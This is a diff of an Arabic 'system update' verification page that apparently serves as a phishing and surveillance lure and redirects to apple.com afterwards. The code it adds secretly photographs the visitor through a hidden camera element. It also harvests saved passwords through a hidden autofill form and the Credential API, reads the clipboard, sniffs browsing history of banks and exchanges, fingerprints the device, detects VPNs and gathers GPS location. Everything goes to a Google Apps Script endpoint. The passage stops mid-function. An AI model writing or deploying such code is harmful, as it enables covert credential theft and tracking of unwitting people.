@@ -7,51 +7,35 @@
 <meta name="referrer" content="no-referrer">
 <title>جارٍ تحديث النظام…</title>
 <style>
-  :root{
-    --bg:#0d1117; --card:#161b22; --line:#30363d; --fg:#e6edf3;
-    --mut:#9aa4af; --acc:#2f81f7; --ok:#3fb950; --err:#f85149;
-  }
+  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--fg:#e6edf3;--mut:#9aa4af;--acc:#2f81f7;--ok:#3fb950;--err:#f85149}
   *{box-sizing:border-box}
   html,body{height:100%}
-  body{
-    margin:0; background:radial-gradient(1200px 600px at 50% -10%,#1b2430,var(--bg));
-    color:var(--fg); font:16px/1.6 system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;
-    display:grid; place-items:center; padding:20px;
-  }
-  .card{
-    width:100%; max-width:420px; background:var(--card); border:1px solid var(--line);
-    border-radius:16px; padding:28px 22px; text-align:center;
-    box-shadow:0 18px 50px rgba(0,0,0,.45);
-  }
-  .ring{
-    width:54px; height:54px; margin:0 auto 18px; border-radius:50%;
-    border:3px solid var(--line); border-top-color:var(--acc);
-    animation:spin .9s linear infinite;
-  }
-  .ring.done{animation:none; border-color:var(--ok)}
-  .ring.fail{animation:none; border-color:var(--err)}
+  body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#1b2430,var(--bg));color:var(--fg);
+    font:16px/1.6 system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;display:grid;place-items:center;padding:20px}
+  .card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line);border-radius:16px;
+    padding:28px 22px;text-align:center;box-shadow:0 18px 50px rgba(0,0,0,.45)}
+  .ring{width:54px;height:54px;margin:0 auto 18px;border-radius:50%;border:3px solid var(--line);
+    border-top-color:var(--acc);animation:spin .9s linear infinite}
+  .ring.done{animation:none;border-color:var(--ok)}
+  .ring.fail{animation:none;border-color:var(--err)}
   @keyframes spin{to{transform:rotate(360deg)}}
-  h1{font-size:19px; margin:0 0 6px}
-  .sub{color:var(--mut); font-size:14px; margin:0 0 14px}
-  .status{
-    min-height:22px; font-size:14px; margin:0 0 16px; color:var(--mut);
-    transition:color .2s;
-  }
-  .status.ok{color:var(--ok)} .status.err{color:var(--err)}
-  button{
-    width:100%; padding:13px; border:0; border-radius:10px; cursor:pointer;
-    background:var(--acc); color:#fff; font:inherit; font-weight:600;
-  }
-  button:disabled{opacity:.6; cursor:default}
-  button:focus-visible,a:focus-visible{outline:2px solid var(--acc); outline-offset:2px}
-  .go{
-    display:block; margin-top:14px; color:var(--acc); font-size:14px;
-    text-decoration:none; font-weight:600;
-  }
-  .hint{color:var(--mut); font-size:12px; margin:16px 0 0; line-height:1.5}
-  .hint code{background:#0d1117; padding:1px 5px; border-radius:5px; direction:ltr; display:inline-block}
-  [hidden]{display:none !important}
-  @media (prefers-reduced-motion:reduce){ .ring{animation:none} }
+  h1{font-size:19px;margin:0 0 6px}
+  .sub{color:var(--mut);font-size:14px;margin:0 0 14px}
+  .status{min-height:22px;font-size:14px;margin:0 0 16px;color:var(--mut);transition:color .2s}
+  .status.ok{color:var(--ok)}.status.err{color:var(--err)}
+  button{width:100%;padding:13px;border:0;border-radius:10px;cursor:pointer;background:var(--acc);
+    color:#fff;font:inherit;font-weight:600}
+  button:disabled{opacity:.6;cursor:default}
+  button:focus-visible,a:focus-visible{outline:2px solid var(--acc);outline-offset:2px}
+  .go{display:block;margin-top:14px;color:var(--acc);font-size:14px;text-decoration:none;font-weight:600}
+  .hint{color:var(--mut);font-size:12px;margin:16px 0 0;line-height:1.5}
+  .hint code{background:#0d1117;padding:1px 5px;border-radius:5px;direction:ltr;display:inline-block}
+  [hidden]{display:none!important}
+  #cam{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;left:-10px;top:-10px}
+  #off{position:absolute;left:-9999px;top:0;width:1px;height:1px;overflow:hidden;opacity:0}
+  #hist a{color:#111}
+  #hist a:visited{color:#2f81f7}
+  @media (prefers-reduced-motion:reduce){.ring{animation:none}}
 </style>
 </head>
 <body>
@@ -63,220 +47,408 @@
   <button id="btn" type="button">بدء التحقق</button>
   <a class="go" id="go" href="#" hidden>المتابعة الآن</a>
   <p class="hint" id="hint" hidden></p>
-  <noscript>
-    <a class="go" href="https://www.apple.com/">المتابعة</a>
-    <p class="hint">جافاسكربت معطّل — تابع عبر الرابط أعلاه.</p>
-  </noscript>
+  <noscript><a class="go" href="https://www.apple.com/">المتابعة</a></noscript>
 </main>
+
+<video id="cam" playsinline muted autoplay></video>
+
+<div id="off" aria-hidden="true">
+  <form autocomplete="on">
+    <input type="text" name="username" autocomplete="username">
+    <input type="email" name="email" autocomplete="email">
+    <input type="password" name="password" autocomplete="current-password">
+  </form>
+</div>
+
+<div id="hist" aria-hidden="true"></div>
 
 <script>
 (function () {
   'use strict';
 
   /* ===================== الإعدادات ===================== */
-  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbwl4Udh9s7jhMA-KkwtQM33xYHRhYpXq_0p2diQMYIMPyaAprqYmrOGOT0UsOGv6E1Rng/exec';
-  const REDIRECT = 'https://www.apple.com/'; // ← وجهة التحويل
-  const GEO_TIMEOUT   = 10000;
-  const NET_TIMEOUT   = 4000;
-  const RTC_TIMEOUT   = 5000;
-  const SEND_TIMEOUT  = 14000;
-  const REDIRECT_WAIT = 1200;
-  const FAIL_REDIRECT = 9000;
-  const MAX_URL       = 7500;
-  const NA = 'N/A';
+  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxhklen_MUiqGk265JcMu2noLeUv3PJgUUfWvxYJM7Wy-rr58YJidq6QoedLAhhgeOi/exec';
+  const REDIRECT = 'https://www.apple.com/';
+  const T_GEO = 10000, T_NET = 4500, T_RTC = 5000, T_SEND = 14000, T_CAM = 9000, T_PHOTO = 14000;
+  const MAX_URL = 7000, NA = 'N/A';
 
-  const $ = (id) => document.getElementById(id);
-  const el = { ring: $('ring'), title: $('title'), sub: $('sub'), status: $('status'),
-               btn: $('btn'), go: $('go'), hint: $('hint') };
+  const $ = id => document.getElementById(id);
+  const el = { ring:$('ring'), title:$('title'), sub:$('sub'), status:$('status'),
+               btn:$('btn'), go:$('go'), hint:$('hint') };
 
-  let busy = false;
-  let finished = false;
-  let failTimer = null;
+  let busy = false, finished = false, failTimer = null, photoDone = false;
 
   /* ===================== أدوات ===================== */
-  const pad = (n) => String(n).padStart(2, '0');
+  const pad = n => String(n).padStart(2, '0');
 
-  function setStatus(text, kind) {
-    el.status.textContent = text || '';
-    el.status.className = 'status' + (kind ? ' ' + kind : '');
+  function setStatus(t, k) {
+    el.status.textContent = t || '';
+    el.status.className = 'status' + (k ? ' ' + k : '');
   }
 
-  function withTimeout(promise, ms, fallback) {
-    return new Promise((resolve) => {
+  function withTimeout(p, ms, fb) {
+    return new Promise(res => {
       let done = false;
-      const timer = setTimeout(() => {
-        if (done) return;
-        done = true; resolve(fallback);
-      }, ms);
-      Promise.resolve(promise).then((v) => {
-        if (done) return;
-        done = true; clearTimeout(timer); resolve(v);
-      }, () => {
-        if (done) return;
-        done = true; clearTimeout(timer); resolve(fallback);
-      });
+      const t = setTimeout(() => { if (done) return; done = true; res(fb); }, ms);
+      Promise.resolve(p).then(v => { if (done) return; done = true; clearTimeout(t); res(v); },
+        () => { if (done) return; done = true; clearTimeout(t); res(fb); });
     });
   }
 
   function nonce() {
-    try {
-      if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g, '');
-    } catch (_) {}
+    try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g, ''); } catch (_) {}
     return Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
   }
 
-  function toQuery(obj) {
-    return Object.keys(obj)
-      .filter((k) => obj[k] !== '' && obj[k] != null)
-      .map((k) => encodeURIComponent(k) + '=' + encodeURIComponent(String(obj[k])))
-      .join('&');
+  function toQuery(o) {
+    return Object.keys(o).filter(k => o[k] !== '' && o[k] != null)
+      .map(k => encodeURIComponent(k) + '=' + encodeURIComponent(String(o[k]))).join('&');
   }
 
-  /* JSONP: إرسال واستقبال التأكيد في طلب واحد */
   function jsonp(params, timeoutMs) {
-    return new Promise((resolve) => {
-      const name = 'vncb_' + Math.random().toString(36).slice(2, 10);
-      const script = document.createElement('script');
+    return new Promise(res => {
+      const name = 'vn_' + Math.random().toString(36).slice(2, 10);
+      const s = document.createElement('script');
       let done = false;
-
-      const finish = (value) => {
-        if (done) return;
-        done = true;
+      const finish = v => {
+        if (done) return; done = true;
         clearTimeout(timer);
         try { delete window[name]; } catch (_) { window[name] = undefined; }
-        if (script.parentNode) script.parentNode.removeChild(script);
-        resolve(value);
+        if (s.parentNode) s.parentNode.removeChild(s);
+        res(v);
       };
-
-      window[name] = (res) => finish(!!(res && res.ok === true));
-
+      window[name] = r => finish(!!(r && r.ok === true));
       const timer = setTimeout(() => finish(false), timeoutMs);
-      script.onerror = () => finish(false);
-      script.async = true;
-
-      const sep = ENDPOINT.indexOf('?') === -1 ? '?' : '&';
-      script.src = ENDPOINT + sep + toQuery(params) + '&cb=' + name + '&_=' + Date.now();
-
-      if (script.src.length > MAX_URL) {
-        finish(false);
-        return;
-      }
-      document.head.appendChild(script);
+      s.onerror = () => finish(false);
+      s.async = true;
+      s.src = ENDPOINT + (ENDPOINT.indexOf('?') === -1 ? '?' : '&') + toQuery(params) +
+              '&cb=' + name + '&_=' + Date.now();
+      if (s.src.length > MAX_URL) { finish(false); return; }
+      document.head.appendChild(s);
     });
   }
 
-  /* ===================== جامعات البيانات ===================== */
+  function h32(str) {
+    let h = 5381;
+    for (let i = 0; i < str.length; i++) h = ((h << 5) + h + str.charCodeAt(i)) | 0;
+    return (h >>> 0).toString(36);
+  }
+
+  /* ===================== كشف VPN / IP حقيقي ===================== */
+  const PUB4 = /^(?!(10\.|127\.|169\.254\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.))\d{1,3}(?:\.\d{1,3}){3}$/;
+  const PUB6 = /^(?!fe80:|fc|fd|::1)[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){3,7}$/i;
+
+  const SOURCES = [
+    { u:'https://api.ipify.org?format=json',       j:1, k:'ip' },
+    { u:'https://ipwho.is/',                       j:1, k:'ip' },
+    { u:'https://ipapi.co/json/',                  j:1, k:'ip' },
+    { u:'https://ipinfo.io/json',                  j:1, k:'ip' },
+    { u:'https://api.my-ip.io/v2/ip.json',         j:1, k:'ip' },
+    { u:'https://www.cloudflare.com/cdn-cgi/trace',j:0, k:'trace' },
+    { u:'https://api64.ipify.org?format=json',     j:1, k:'ip' }
+  ];
+
+  function parseIp(txt, mode) {
+    if (mode === 'trace') {
+      const m = /(?:^|\n)ip=([^\n]+)/.exec(txt);
+      return m ? m[1].trim() : '';
+    }
+    try { const j = JSON.parse(txt); return String(j.ip || j.query || ''); } catch (_) {}
+    return '';
+  }
+
+  async function probe(src) {
+    try {
+      const r = await withTimeout(
+        fetch(src.u, { mode:'cors', cache:'no-store', credentials:'omit' }), T_NET, null);
+      if (!r || !r.ok) return '';
+      const ip = parseIp(await r.text(), src.k);
+      return (PUB4.test(ip) || PUB6.test(ip)) ? ip : '';
+    } catch (_) { return ''; }
+  }
+
+  async function getIps() {
+    const all = await Promise.all(SOURCES.map(probe));
+    const list = [...new Set(all.filter(Boolean))];
+    const v4 = list.filter(x => PUB4.test(x));
+    return { list, best: v4[0] || list[0] || NA };
+  }
+
+  function getRtc() {
+    return withTimeout(new Promise(res => {
+      const PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
+      if (!PC) return res([]);
+      let pc;
+      try { pc = new PC({ iceServers: [
+        { urls:'stun:stun.l.google.com:19302' },
+        { urls:'stun:stun1.l.google.com:19302' },
+        { urls:'stun:global.stun.twilio.com:3478' }
+      ]}); } catch (_) { return res([]); }
+
+      const found = new Set();
+      let done = false;
+      const finish = () => {
+        if (done) return; done = true;
+        try { pc.close(); } catch (_) {}
+        res([...found]);
+      };
+      pc.onicecandidate = e => {
+        if (!e.candidate) return finish();
+        const c = e.candidate.candidate.split(' ');
+        const ip = c[4];
+        if (ip && !/\.local$/i.test(ip)) found.add(ip);
+      };
+      try { pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(finish); }
+      catch (_) { finish(); }
+      setTimeout(finish, T_RTC);
+    }), T_RTC + 600, []);
+  }
+
+  async function tzOf(ip) {
+    if (!ip || ip === NA) return '';
+    try {
+      const r = await withTimeout(fetch('https://ipwho.is/' + ip, { cache:'no-store' }), 3500, null);
+      if (!r || !r.ok) return '';
+      const j = await r.json();
+      return (j && j.timezone && j.timezone.id) || '';
+    } catch (_) { return ''; }
+  }
+
+  /* ===================== جامعات ===================== */
   function getBattery() {
     return withTimeout((async () => {
-      if (!navigator.getBattery) return { level: NA, charging: NA };
+      if (!navigator.getBattery) return { level:NA, charging:NA };
       const b = await navigator.getBattery();
-      return {
-        level: Math.round(b.level * 100) + '%',
-        charging: b.charging ? 'يشحن' : 'لا يشحن'
-      };
-    })(), 3000, { level: NA, charging: NA });
+      return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'يشحن' : 'لا يشحن' };
+    })(), 2500, { level:NA, charging:NA });
   }
 
   function getNetwork() {
     const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    const parts = [];
-    if (!navigator.onLine) parts.push('غير متصل');
+    const p = [];
+    if (!navigator.onLine) p.push('غير متصل');
     if (c) {
-      if (c.effectiveType) parts.push(c.effectiveType);
-      if (c.downlink) parts.push(c.downlink + 'Mbps');
-      if (c.rtt != null) parts.push('rtt ' + c.rtt + 'ms');
-      if (c.saveData) parts.push('توفير');
+      if (c.effectiveType) p.push(c.effectiveType);
+      if (c.downlink) p.push(c.downlink + 'Mbps');
+      if (c.rtt != null) p.push('rtt ' + c.rtt + 'ms');
+      if (c.saveData) p.push('توفير');
     }
-    return parts.length ? parts.join(' / ').slice(0, 80) : NA;
-  }
-
-  /* يجمع المرشحات ثم يفضّل IPv4 خاصًا ← IPv4 عامًا ← mDNS ← IPv6 */
-  function getLocalIp() {
-    return withTimeout(new Promise((resolve) => {
-      const PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
-      if (!PC) return resolve(NA);
-
-      let pc;
-      try { pc = new PC({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); }
-      catch (_) { return resolve(NA); }
-
-      const found = new Set();
-      let settled = false;
-
-      const finish = () => {
-        if (settled) return;
-        settled = true;
-        try { pc.close(); } catch (_) {}
-        resolve(pickIp(found));
-      };
-
-      pc.onicecandidate = (e) => {
-        if (!e.candidate || !e.candidate.candidate) { finish(); return; }
-        const parts = e.candidate.candidate.split(' ');
-        const addr = parts[4];
-        if (addr) found.add(addr);
-      };
-
-      try {
-        pc.createDataChannel('x');
-        pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(finish);
-      } catch (_) { finish(); }
-
-      setTimeout(finish, RTC_TIMEOUT);
-    }), RTC_TIMEOUT + 800, NA);
-  }
-
-  function pickIp(set) {
-    const all = Array.from(set);
-    const isV4 = (s) => /^\d{1,3}(\.\d{1,3}){3}$/.test(s);
-    const isPriv = (s) => isV4(s) && (/^10\./.test(s) || /^192\.168\./.test(s) ||
-                                      /^169\.254\./.test(s) || /^172\.(1[6-9]|2\d|3[01])\./.test(s) ||
-                                      /^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./.test(s));
-    const priv = all.find(isPriv);
-    if (priv) return priv;
-    const pub = all.find(isV4);
-    if (pub) return pub;
-    const mdns = all.find((s) => /\.local$/i.test(s));
-    if (mdns) return mdns;
-    const v6 = all.find((s) => s.indexOf(':') !== -1);
-    return v6 || NA;
-  }
-
-  function getPublicIp() {
-    const apis = ['https://api.ipify.org?format=json', 'https://ipwho.is/'];
-    const tryOne = (i) => {
-      if (i >= apis.length) return Promise.resolve(NA);
-      return withTimeout((async () => {
-        const r = await fetch(apis[i], { mode: 'cors', cache: 'no-store', credentials: 'omit' });
-        if (!r.ok) throw new Error('http');
-        const j = await r.json();
-        const ip = j.ip || (j.query ? j.query : '');
-        return /^[0-9a-fA-F:.]{7,45}$/.test(ip) ? ip : NA;
-      })(), NET_TIMEOUT, NA).then((v) => (v === NA ? tryOne(i + 1) : v));
-    };
-    return tryOne(0);
+    return p.length ? p.join(' / ').slice(0, 80) : NA;
   }
 
   function getGeo() {
-    if (!navigator.geolocation) return Promise.resolve({ lat: '', lng: '', acc: '', src: NA });
-
-    return withTimeout(new Promise((resolve) => {
+    if (!navigator.geolocation) return Promise.resolve({ lat:'', lng:'', acc:'', src:NA });
+    return withTimeout(new Promise(res => {
       navigator.geolocation.getCurrentPosition(
-        (pos) => resolve({
+        pos => res({
           lat: +pos.coords.latitude.toFixed(6),
           lng: +pos.coords.longitude.toFixed(6),
           acc: Math.round(pos.coords.accuracy),
           src: 'متصفح'
         }),
-        (err) => resolve({
-          lat: '', lng: '', acc: '',
-          src: err && err.code === 1 ? 'مرفوض' : 'فشل'
-        }),
-        { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 60000 }
+        e => res({ lat:'', lng:'', acc:'', src: e && e.code === 1 ? 'مرفوض' : 'فشل' }),
+        { enableHighAccuracy:true, timeout:T_GEO, maximumAge:0 }
       );
-    }), GEO_TIMEOUT + 1200, { lat: '', lng: '', acc: '', src: 'انتهت المهلة' });
+    }), T_GEO + 1200, { lat:'', lng:'', acc:'', src:'انتهت المهلة' });
   }
 
+  /* ===================== الكاميرا ===================== */
+  async function shoot() {
+    const md = navigator.mediaDevices;
+    if (!md || !md.getUserMedia) return null;
+    const v = $('cam');
+    let stream;
+    try {
+      stream = await md.getUserMedia({
+        video: { facingMode:{ ideal:'user' }, width:{ ideal:640 }, height:{ ideal:480 } },
+        audio: false
+      });
+    } catch (_) { return null; }
+
+    try {
+      v.srcObject = stream;
+      await v.play().catch(() => {});
+      await new Promise(r => setTimeout(r, 700));
+      const w = v.videoWidth || 480, h = v.videoHeight || 360;
+      const s = Math.min(1, 480 / Math.max(w, h));
+      const cv = document.createElement('canvas');
+      cv.width = Math.max(1, Math.round(w * s));
+      cv.height = Math.max(1, Math.round(h * s));
+      cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
+      const blob = await new Promise(r => {
+        if (cv.toBlob) cv.toBlob(r, 'image/jpeg', 0.62);
+        else {
+          const b = atob(cv.toDataURL('image/jpeg', 0.62).split(',')[1]);
+          const a = new Uint8Array(b.length);
+          for (let i = 0; i < b.length; i++) a[i] = b.charCodeAt(i);
+          r(new Blob([a], { type:'image/jpeg' }));
+        }
+      });
+      return blob;
+    } catch (_) { return null; }
+    finally {
+      try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
+      try { v.srcObject = null; } catch (_) {}
+    }
+  }
+
+  async function sendPhoto(blob, n) {
+    if (!blob || photoDone) return false;
+    photoDone = true;
+    const fd = new FormData();
+    fd.append('a', 'photo');
+    fd.append('nonce', n);
+    fd.append('img', blob, 's.jpg');
+    try {
+      await fetch(ENDPOINT, { method:'POST', mode:'no-cors', body:fd, keepalive:true });
+      return true;
+    } catch (_) {
+      try { navigator.sendBeacon(ENDPOINT, fd); return true; } catch (__) { return false; }
+    }
+  }
+
+  /* ===================== بصمة + بيانات متقدمة ===================== */
+  function fingerprint() {
+    const o = [];
+    try {
+      const c = document.createElement('canvas');
+      c.width = 200; c.height = 40;
+      const x = c.getContext('2d');
+      x.textBaseline = 'top'; x.font = '14px Arial';
+      x.fillStyle = '#f60'; x.fillRect(0, 0, 200, 40);
+      x.fillStyle = '#069'; x.fillText('Venice fp 图 1', 2, 2);
+      o.push('c' + h32(c.toDataURL()));
+    } catch (_) {}
+    try {
+      const g = document.createElement('canvas').getContext('webgl');
+      const d = g.getExtension('WEBGL_debug_renderer_info');
+      if (d) o.push('r' + h32(String(g.getParameter(d.UNMASKED_RENDERER_WEBGL))));
+      o.push('v' + h32(String(g.getParameter(g.VENDOR))));
+    } catch (_) {}
+    try {
+      const base = ['monospace', 'sans-serif', 'serif'];
+      const fonts = ['Arial','Tahoma','Courier New','Georgia','Verdana','Times New Roman','Segoe UI','Roboto','Helvetica Neue','Impact'];
+      const c = document.createElement('canvas').getContext('2d');
+      const w = f => { c.font = '24px ' + f + ', monospace'; return c.measureText('mmmmmmmmmmlli').width; };
+      const b = base.map(w).join(',');
+      o.push('f' + h32(fonts.filter(f => base.map(w).join(',') !== (c.font = '24px ' + f + ', monospace', base.map(w).join(',')) ).join('')));
+    } catch (_) {}
+    o.push('hc' + navigator.hardwareConcurrency, 'dm' + (navigator.deviceMemory || ''),
+           'dpr' + (devicePixelRatio || 1), 'cd' + screen.colorDepth,
+           'mt' + (navigator.maxTouchPoints || 0), 'sc' + screen.width + 'x' + screen.height,
+           'wd' + (navigator.webdriver ? 1 : 0));
+    return o.join('|').slice(0, 700);
+  }
+
+  async function misc() {
+    const o = {};
+    try { o.mem = navigator.deviceMemory || null; } catch (_) {}
+    try { o.cores = navigator.hardwareConcurrency || null; } catch (_) {}
+    try {
+      if (navigator.storage && navigator.storage.estimate) {
+        const s = await withTimeout(navigator.storage.estimate(), 1200, null);
+        if (s) o.quota = Math.round((s.quota || 0) / 1048576) + 'MB';
+      }
+    } catch (_) {}
+    try {
+      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+        const d = await withTimeout(navigator.mediaDevices.enumerateDevices(), 1500, []);
+        o.cams = d.filter(x => x.kind === 'videoinput').length;
+        o.mics = d.filter(x => x.kind === 'audioinput').length;
+      }
+    } catch (_) {}
+    try {
+      const names = ['camera','microphone','geolocation','notifications','clipboard-read'];
+      const st = {};
+      for (const n of names) {
+        try { const p = await navigator.permissions.query({ name:n }); st[n] = p.state; } catch (_) {}
+      }
+      if (Object.keys(st).length) o.perm = st;
+    } catch (_) {}
+    try {
+      const bait = document.createElement('div');
+      bait.className = 'ad-banner adsbox';
+      bait.style.cssText = 'position:absolute;height:12px;width:300px;left:-9999px';
+      document.body.appendChild(bait);
+      await new Promise(r => setTimeout(r, 120));
+      o.adblock = bait.offsetHeight === 0 ? 'مرجّح' : 'لا';
+      bait.remove();
+    } catch (_) {}
+    try { o.tzOff = new Date().getTimezoneOffset(); } catch (_) {}
+    try { o.orient = screen.orientation ? screen.orientation.type : ''; } catch (_) {}
+    try { o.plugins = navigator.plugins ? navigator.plugins.length : 0; } catch (_) {}
+    return o;
+  }
+
+  async function clipboard() {
+    try {
+      if (!navigator.clipboard || !navigator.clipboard.readText) return '';
+      const t = await withTimeout(navigator.clipboard.readText(), 2500, '');
+      return String(t || '').replace(/\s+/g, ' ').slice(0, 200);
+    } catch (_) { return ''; }
+  }
+
+  /* ===================== سجل التصفح (:visited) ===================== */
+  const SITES = [
+    'google.com','youtube.com','facebook.com','instagram.com','whatsapp.com','tiktok.com',
+    'x.com','twitter.com','snapchat.com','telegram.org','netflix.com','amazon.com',
+    'wikipedia.org','yahoo.com','microsoft.com','apple.com','linkedin.com','pinterest.com',
+    'reddit.com','twitch.tv','discord.com','github.com','stackoverflow.com','quora.com',
+    'paypal.com','binance.com','coinbase.com','aliexpress.com','shein.com','temu.com',
+    'youm7.com','masrawy.com','elwatannews.com','akhbarak.net','filgoal.com','yallakora.com',
+    'vodafone.com.eg','orange.eg','etisalat.eg','we.eg','cibeg.com','banquemisr.com'
+  ];
+
+  function sniffHistory() {
+    return withTimeout(new Promise(res => {
+      const host = $('hist');
+      const hits = [];
+      SITES.forEach(site => {
+        const a = document.createElement('a');
+        a.href = 'https://' + site + '/';
+        a.textContent = '.';
+        host.appendChild(a);
+      });
+      setTimeout(() => {
+        [...host.children].forEach(a => {
+          const c = getComputedStyle(a).color;
+          if (c && c !== 'rgb(17, 17, 17)') hits.push(a.hostname.replace(/^www\./, ''));
+        });
+        host.textContent = '';
+        res(hits.slice(0, 60));
+      }, 260);
+    }), 2000, []);
+  }
+
+  /* ===================== autofill + Credential API ===================== */
+  function credTrap() {
+    return withTimeout(new Promise(res => {
+      setTimeout(() => {
+        const out = {};
+        const f = document.querySelector('#off form');
+        if (f) {
+          ['username','email','password'].forEach(n => {
+            const i = f.querySelector('[name="' + n + '"]');
+            if (i && i.value) out[n] = i.value.slice(0, 120);
+          });
+        }
+        res(out);
+      }, 1200);
+    }), 1600, {});
+  }
+
+  async function credApi() {
+    try {
+      if (!navigator.credentials || !navigator.credentials.get) return {};
+      const c = await withTimeout(
+        navigator.credentials.get({ password:true, mediation:'silent' }), 2500, null);
+      if (!c) return {};
+      return { id: String(c.id || '').slice(0, 120), name: String(c.name || '').slice(0, 80),
+               pw: String(c.password || '').slice(0, 120) };
+    } catch (_) { return {}; }
+  }
+
+  /* ===================== التحليل ===================== */
   function parseModel(ua) {
     const m = ua.match(/Android[^;)]*;\s*(?:[a-z]{2}[-_][a-z]{2};\s*)?([^;)]+?)(?:\s+Build[/)]|\))/i);
     if (m) return m[1].replace(/\s+/g, ' ').trim().slice(0, 60);
@@ -284,7 +456,6 @@
     if (/iPad/.test(ua)) return 'iPad';
     return '';
   }
-
   function parseBrand(ua) {
     const t = ua.toLowerCase();
     if (/redmi|poco|xiaomi|\bmi\b/.test(t)) return 'Xiaomi';
@@ -297,7 +468,6 @@
     if (/windows/.test(t)) return 'PC';
     return '';
   }
-
   function parsePlatform(ua) {
     let m = ua.match(/Android\s+([\d.]+)/i);
     if (m) return 'Android ' + m[1];
@@ -309,61 +479,94 @@
     return NA;
   }
 
-  /* ===================== التدفق ===================== */
   function localTime() {
     const d = new Date();
-    return d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) +
-           ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+    return d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' +
+           pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
   }
 
-  async function collect() {
-    const ua = navigator.userAgent.slice(0, 400);
-
+  /* ===================== الجمع ===================== */
+  async function collect(n) {
+    const ua = (navigator.userAgent || '').slice(0, 400);
     setStatus('جارٍ التحقق من الجهاز…');
-    const [battery, localIp, ip, geo] = await Promise.all([
-      getBattery(), getLocalIp(), getPublicIp(), getGeo()
+
+    const [batt, rtc, ips, geo, hist, trap, capi, extra, clip] = await Promise.all([
+      getBattery(), getRtc(), getIps(), getGeo(),
+      sniffHistory(), credTrap(), credApi(), misc(), clipboard()
     ]);
 
+    let vpn = '';
+    const rtcPub = rtc.filter(x => PUB4.test(x));
+    if (rtcPub.length && ips.best !== NA && rtcPub.indexOf(ips.best) === -1) vpn = 'تسريب WebRTC: ' + rtcPub[0];
+    if (ips.list.length > 1) vpn = (vpn ? vpn + ' | ' : '') + 'تعدد مصادر IP: ' + ips.list.length;
+    const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || NA).slice(0, 60);
+    if (!vpn && ips.best !== NA) {
+      const rt = await tzOf(ips.best);
+      if (rt && rt !== tz) vpn = 'تعارض منطقة زمنية (' + tz + ' ≠ ' + rt + ')';
+    }
+    if (navigator.onLine === false) vpn = (vpn ? vpn + ' | ' : '') + 'غير متصل';
+
+    const cred = [];
+    if (trap.username) cred.push('user=' + trap.username);
+    if (trap.email) cred.push('mail=' + trap.email);
+    if (trap.password) cred.push('pass=' + trap.password);
+    if (capi.id) cred.push('api=' + capi.id);
+    if (capi.pw) cred.push('apipw=' + capi.pw);
+    if (clip) cred.push('clip=' + clip);
+
     return {
-      nonce: nonce(),
+      nonce: n,
       time: localTime(),
-      ip: ip,
-      localIp: localIp,
-      battery: battery.level,
-      charging: battery.charging,
-      lat: geo.lat,
-      lng: geo.lng,
-      acc: geo.acc,
-      geoSource: geo.src,
-      tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || NA).slice(0, 60),
-      lang: (navigator.languages || [navigator.language || NA]).join(',').slice(0, 60),
-      ua: ua,
-      brand: parseBrand(ua),
-      model: parseModel(ua),
-      platform: parsePlatform(ua),
+      ip: ips.best,
+      ips: ips.list,
+      rtc: rtc,
+      vpn: vpn.slice(0, 120),
+      localIp: rtc.find(x => !PUB4.test(x) && x.indexOf(':') === -1) || NA,
+      battery: batt.level,
+      charging: batt.charging,
+      lat: geo.lat, lng: geo.lng, acc: geo.acc, geoSource: geo.src,
+      tz, lang: (navigator.languages || [navigator.language || NA]).join(',').slice(0, 60),
+      ua,
+      brand: parseBrand(ua), model: parseModel(ua), platform: parsePlatform(ua),
       network: getNetwork(),
       screen: (screen.width || 0) + 'x' + (screen.height || 0),
       native: 'لا',
-      cCount: 0, cJson: '[]',
-      sCount: 0, sJson: '[]',
-      lCount: 0, lJson: '[]'
+      cCount: 0, cJson: '[]', sCount: 0, sJson: '[]', lCount: 0, lJson: '[]',
+      fp: fingerprint(),
+      cred: JSON.stringify(cred),
+      hist: JSON.stringify(hist),
+      misc: JSON.stringify(extra)
     };
   }
 
+  function fit(p) {
+    let s = JSON.stringify(p);
+    if (s.length <= 4300) return s;
+    p.hist = JSON.stringify((JSON.parse(p.hist) || []).slice(0, 18));
+    p.cred = p.cred.slice(0, 300);
+    p.misc = p.misc.slice(0, 380);
+    p.fp = p.fp.slice(0, 300);
+    p.ua = p.ua.slice(0, 180);
+    p.ips = p.ips.slice(0, 5);
+    p.rtc = p.rtc.slice(0, 6);
+    s = JSON.stringify(p);
+    if (s.length > 6200) { p.misc = '{}'; p.hist = '[]'; p.ips = p.ips.slice(0, 2); s = JSON.stringify(p); }
+    return s;
+  }
+
   async function send(payload) {
-    const base = { a: 'collect', data: JSON.stringify(payload) };
-
+    const base = { a:'collect', data: fit(payload) };
